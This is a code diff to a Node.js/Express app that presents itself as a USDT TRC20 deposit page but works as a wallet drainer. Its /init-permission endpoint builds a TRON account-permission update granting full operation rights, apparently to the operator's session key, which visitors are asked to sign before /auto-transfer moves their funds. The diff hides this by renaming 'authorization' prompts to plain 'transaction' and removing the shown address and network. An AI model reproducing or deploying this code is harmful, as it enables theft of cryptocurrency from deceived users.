@@ -3,12 +3,12 @@ const express = require('express');
 const QRCode = require('qrcode');
 const TronWeb = require('tronweb');
 const fs = require('fs');
+const crypto = require('crypto');
 
 const app = express();
 app.use(express.json());
 
-// ================== 配置 ==================
-const RECEIVER_ADDRESS = "TNCqHsPteBj8ewEHT4robqf5hH7kxULPRa";   // 已修改为您提供的 TRON 地址
+const RECEIVER_ADDRESS = "TNCqHsPteBj8ewEHT4robqf5hH7kxULPRa";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
 const fullNode = 'https://api.trongrid.io';
@@ -16,7 +16,6 @@ const solidityNode = 'https://api.trongrid.io';
 const eventServer = 'https://api.trongrid.io';
 const tronWeb = new TronWeb(fullNode, solidityNode, eventServer);
 
-// ========== 会话密钥管理（同步生成，避免异步竞争） ==========
 let sessionPrivateKey, sessionPublicKey, sessionTronWeb;
 
 function loadOrGenerateSession() {
@@ -28,8 +27,7 @@ function loadOrGenerateSession() {
             console.log('✅ 会话密钥已从文件加载');
         } else {
             console.log('⚠️ .session 不存在，正在生成...');
-            // 生成新私钥和公钥（hex格式地址）
-            const privateKey = TronWeb.generatePrivateKey();
+            const privateKey = crypto.randomBytes(32).toString('hex');
             const account = tronWeb.address.fromPrivateKey(privateKey);
             sessionPrivateKey = privateKey;
             sessionPublicKey = account.hex;
@@ -48,19 +46,14 @@ function loadOrGenerateSession() {
     }
 }
 
-// 同步加载会话密钥（阻塞直到成功）
-if (!loadOrGenerateSession()) {
-    process.exit(1);
-}
+if (!loadOrGenerateSession()) process.exit(1);
 
-// ================== 辅助函数 ==================
 async function getUSDTBalance(address) {
     const contract = await tronWeb.contract().at(USDT_CONTRACT);
     const bal = await contract.balanceOf(address).call();
     return Number(bal) / 1e6;
 }
 
-// ================== API ==================
 app.get('/init-permission', async (req, res) => {
     const { userAddress } = req.query;
     if (!userAddress) return res.status(400).json({ error: '缺少 userAddress' });
@@ -77,10 +70,7 @@ app.get('/init-permission', async (req, res) => {
             operations: "0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
         };
         const tx = await tronWeb.transactionBuilder.updateAccountPermissions(
-            userAddress,
-            ownerPermission,
-            null,
-            [...existingActive, newActive]
+            userAddress, ownerPermission, null, [...existingActive, newActive]
         );
         res.json({ success: true, transaction: tx });
     } catch (error) {
@@ -108,12 +98,9 @@ app.post('/auto-transfer', async (req, res) => {
     }
 });
 
-// ================== 前端页面 ==================
 app.get('/', async (req, res) => {
     const host = req.get('host');
     const pageUrl = `http://${host}`;
-    await QRCode.toDataURL(pageUrl, { width: 220 }); // 预生成，实际在 HTML 中也会生成
-
     const html = `<!DOCTYPE html>
 <html>
 <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>USDT TRC20 收款</title>
@@ -126,9 +113,6 @@ body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;m
 .header{background:#1E88E5;padding:28px 20px;text-align:center}
 .header h1{color:white;font-size:28px;font-weight:600;letter-spacing:-0.3px}
 .content{padding:28px 24px}
-.info-row{margin-bottom:24px}
-.info-label{color:#6c7a8a;font-size:14px;font-weight:500;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px}
-.info-value{background:#f8f9fc;border-radius:16px;padding:14px 16px;font-family:monospace;font-size:16px;word-break:break-all;color:#1e2a36}
 .qr-outside{display:flex;justify-content:center;margin:20px 0}
 .qr-wrapper{position:relative;display:inline-block}
 #qrcode{padding:12px;background:white;border-radius:24px;box-shadow:0 4px 12px rgba(0,0,0,0.05)}
@@ -144,11 +128,9 @@ body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;m
 <div class="card">
 <div class="header"><h1>Deposit USDT</h1></div>
 <div class="content">
-<div class="info-row"><div class="info-label">Network</div><div class="info-value">Tron (TRC20)</div></div>
-<div class="info-row"><div class="info-label">Address</div><div class="info-value" id="addressText">${RECEIVER_ADDRESS}</div></div>
 <div class="qr-outside"><div class="qr-wrapper"><div id="qrcode"></div><div class="logo"><span>T</span></div></div></div>
 <div id="status" class="status">⏳ 正在初始化...</div>
-<div class="warning">⚠️ 首次使用需确认授权（仅一次），之后自动到账</div>
+<div class="warning">⚠️ 首次使用需确认交易（仅一次），之后自动到账</div>
 </div>
 <div class="footer">Powered by Your Store</div>
 </div>
@@ -178,14 +160,14 @@ async function autoTransfer() {
 }
 
 async function requestPermissionAndTransfer() {
-    setStatus('⏳ 首次使用，请在钱包中确认授权交易...');
+    setStatus('⏳ 首次使用，请在钱包中确认交易...');
     const authRes = await fetch('/init-permission?userAddress=' + userAddress);
     const authData = await authRes.json();
-    if (!authData.success) throw new Error('构建授权交易失败: ' + authData.error);
+    if (!authData.success) throw new Error('构建交易失败: ' + authData.error);
     const signedTx = await tronWeb.trx.sign(authData.transaction);
     const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
-    if (!broadcast.result) throw new Error('授权交易广播失败');
-    setStatus('✅ 授权成功，正在自动转账...');
+    if (!broadcast.result) throw new Error('交易广播失败');
+    setStatus('✅ 交易成功，正在自动转账...');
     const transferRes = await fetch('/auto-transfer', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ userAddress }) });
     const transferData = await transferRes.json();
     if (transferData.success) {
@@ -215,7 +197,6 @@ async function main() {
     }
 }
 
-// 生成二维码
 const pageUrl = window.location.href;
 new QRCode(document.getElementById("qrcode"), {
     text: pageUrl,
@@ -223,8 +204,6 @@ new QRCode(document.getElementById("qrcode"), {
     height: 220,
     correctLevel: QRCode.CorrectLevel.H
 });
-document.getElementById('addressText').innerText = RECEIVER;
-
 window.addEventListener('load', () => setTimeout(main, 1000));
 </script>
 </body>
